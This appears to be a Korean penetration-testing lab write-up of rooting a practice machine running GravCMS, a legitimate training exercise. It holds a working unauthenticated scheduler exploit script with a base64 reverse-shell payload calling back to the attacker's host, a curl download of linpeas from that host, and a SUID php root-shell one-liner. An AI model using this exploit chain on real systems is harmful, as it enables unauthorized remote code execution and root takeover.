
Nmap
```bash
┌──(kali㉿kali)-[~/PG/Astronaut]
└─$ cat nmap.log
# Nmap 7.98 scan initiated Mon Jun 15 13:10:06 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.115.12
Nmap scan report for 192.168.115.12
Host is up (0.067s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2021-03-17 17:46  grav-admin/
|_
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT      ADDRESS
1   66.79 ms 192.168.45.1
2   66.71 ms 192.168.45.254
3   66.89 ms 192.168.251.1
4   67.02 ms 192.168.115.12

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun 15 13:10:32 2026 -- 1 IP address (1 host up) scanned in 25.84 seconds
```



`/grav-admin/admin` 주소 획득
```bash
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.115.12/grav-admin
 🚩  In-Scope Url          │ 192.168.115.12
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 👌  Status Codes          │ [200]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      138l      931w    15508c http://192.168.115.12/grav-admin/admin
200      GET      159l     1203w    14014c http://192.168.115.12/grav-admin/home
[####################] - 7m     66153/66153   0s      found:2       errors:28464
[####################] - 2m      4614/4614    37/s    http://192.168.115.12/grav-admin/
[####################] - 2m      4614/4614    31/s    http://192.168.115.12/grav-admin/assets/
[####################] - 3m      4614/4614    31/s    http://192.168.115.12/grav-admin/backup/
[####################] - 3m      4614/4614    29/s    http://192.168.115.12/grav-admin/bin/
[####################] - 3m      4614/4614    30/s    http://192.168.115.12/grav-admin/cache/
[####################] - 3m      4614/4614    28/s    http://192.168.115.12/grav-admin/images/
[####################] - 3m      4614/4614    28/s    http://192.168.115.12/grav-admin/logs/
[####################] - 3m      4614/4614    29/s    http://192.168.115.12/grav-admin/system/
[####################] - 3m      4614/4614    29/s    http://192.168.115.12/grav-admin/tmp/
[####################] - 2m      4614/4614    31/s    http://192.168.115.12/grav-admin/system/images/
[####################] - 2m      4614/4614    32/s    http://192.168.115.12/grav-admin/system/pages/
[####################] - 2m      4614/4614    33/s    http://192.168.115.12/grav-admin/system/templates/
[####################] - 2m      4614/4614    34/s    http://192.168.115.12/grav-admin/system/images/media/
[####################] - 2m      4614/4614    42/s    http://192.168.115.12/grav-admin/system/templates/flex/                                      
```


로그인 페이지 확인
![[Pasted image 20260615132932.png]]


exploit 검색
```bash
┌──(kali㉿kali)-[~/PG/Astronaut]
└─$ searchsploit grav
-------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                      |  Path
-------------------------------------------------------------------- ---------------------------------
BitDefender GravityZone 5.1.5.386 - Multiple Vulnerabilities        | linux/webapps/34086.txt
Cobian Backup 11 Gravity 11.2.0.582 - 'Password' Denial of Service  | windows/local/50790.py
Cobian Backup Gravity 11.2.0.582 - 'CobianBackup11' Unquoted Servic | windows/local/50791.txt
Grav CMS 1.4.2 Admin Plugin - Cross-Site Scripting                  | php/webapps/42131.txt
Grav CMS 1.6.30 Admin Plugin 1.9.18 - 'Page Title' Persistent Cross | php/webapps/49264.txt
Grav CMS 1.7.10 - Server-Side Template Injection (SSTI) (Authentica | php/webapps/49961.py
Grav CMS 1.7.48 - Remote Code Execution (RCE)                       | php/webapps/52402.txt
GravCMS 1.10.7 - Arbitrary YAML Write/Update (Unauthenticated) (2)  | php/webapps/49973.py
GravCMS 1.10.7 - Unauthenticated Arbitrary File Write (Metasploit)  | php/webapps/49788.rb
```
![[Pasted image 20260615134012.png]]

exploit 다운로드
```bash
┌──(kali㉿kali)-[~/PG/Astronaut]
└─$ searchsploit -m 49973
  Exploit: GravCMS 1.10.7 - Arbitrary YAML Write/Update (Unauthenticated) (2)
      URL: https://www.exploit-db.com/exploits/49973
     Path: /usr/share/exploitdb/exploits/php/webapps/49973.py
    Codes: N/A
 Verified: True
File Type: ASCII text, with very long lines (429)
Copied to: /home/kali/PG/Astronaut/49973.py
```

targetIP, payload 수정 **실제 주소가 http://192.168.115.12/grav-admin 이므로 이걸로 수정해야 함**
```bash
┌──(kali㉿kali)-[~/PG/Astronaut]
└─$ cat 49973.py
# Exploit Title: GravCMS 1.10.7 - Arbitrary YAML Write/Update (Unauthenticated) (2)
# Original Exploit Author: Mehmet Ince
# Vendor Homepage: https://getgrav.org
# Version: 1.10.7
# Tested on: Debian 10
# Author: legend

#/usr/bin/python3

import requests
import sys
import re
import base64
target= "http://192.168.115.12/grav-admin"
#Change base64 encoded value with with below command.
#echo -ne "bash -i >& /dev/tcp/192.168.1.3/4444 0>&1" | base64 -w0
payload=b"""/*<?php /**/
file_put_contents('/tmp/rev.sh',base64_decode('YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE3OS80NDQ0IDA+JjE='));chmod('/tmp/rev.sh',0755);system('bash /tmp/rev.sh');
"""
s = requests.Session()
r = s.get(target+"/admin")
adminNonce = re.search(r'admin-nonce" value="(.*)"',r.text).group(1)
if adminNonce != "" :
    url = target + "/admin/tools/scheduler"
    data = "admin-nonce="+adminNonce
    data +='&task=SaveDefault&data%5bcustom_jobs%5d%5bncefs%5d%5bcommand%5d=/usr/bin/php&data%5bcustom_jobs%5d%5bncefs%5d%5bargs%5d=-r%20eval%28base64_decode%28%22'+base64.b64encode(payload).decode('utf-8')+'%22%29%29%3b&data%5bcustom_jobs%5d%5bncefs%5d%5bat%5d=%2a%20%2a%20%2a%20%2a%20%2a&data%5bcustom_jobs%5d%5bncefs%5d%5boutput%5d=&data%5bstatus%5d%5bncefs%5d=enabled&data%5bcustom_jobs%5d%5bncefs%5d%5boutput_mode%5d=append'
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    r = s.post(target+"/admin/config/scheduler",data=data,headers=headers)
```

자격증명 획득
![[Pasted image 20260615140619.png]]


```bash
#발신
python -m http.server 80
#수신
curl -O http://192.168.45.179/linpeas.sh
```


crontab 확인
```bash
www-data@gravity:~/html$ crontab -l
crontab -l
* * * * * cd /var/www/html/grav-admin;/usr/bin/php bin/grav scheduler 1>> /dev/null 2>&1
```

https://gtfobins.org/gtfobins/php/#suid
```bash
php -r 'posix_setuid(0); system("/bin/sh -i");'
```
![[Pasted image 20260615153618.png]]

자격증명 획득 후 flag  획득

![[Pasted image 20260615153700.png]]